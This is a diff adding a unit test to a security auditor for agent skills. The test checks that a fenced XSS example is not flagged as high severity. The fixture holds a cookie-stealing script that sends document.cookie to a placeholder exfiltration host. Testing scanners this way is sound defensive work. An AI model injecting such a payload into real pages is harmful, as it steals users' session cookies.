@@ -186,6 +186,40 @@ class SkillSecurityAuditorTests(unittest.TestCase):
                 for finding in result["findings"])
         )
 
+    def test_placeholder_xss_exfil_example_is_not_flagged_high(self):
+        skill_dir = self._make_skill(
+            textwrap.dedent(
+                """\
+                ---
+                name: demo-skill
+                description: Demo
+                license: MIT
+                allowed-tools: []
+                ---
+                """
+            ),
+            {
+                "client-side.md": textwrap.dedent(
+                    """\
+                    ```html
+                    <script>fetch('https://exfil.com/?c='+document.cookie)</script>
+                    ```
+                    """
+                )
+            },
+        )
+
+        result = scan_skill(skill_dir)
+
+        self.assertEqual(result["verdict"], "PASS")
+        self.assertFalse(
+            any(
+                finding["severity"] == "HIGH"
+                and "XSS payload accessing sensitive DOM" in finding["message"]
+                for finding in result["findings"]
+            )
+        )
+
     def test_indented_shell_example_is_still_treated_as_code(self):
         skill_dir = self._make_skill(
             textwrap.dedent(
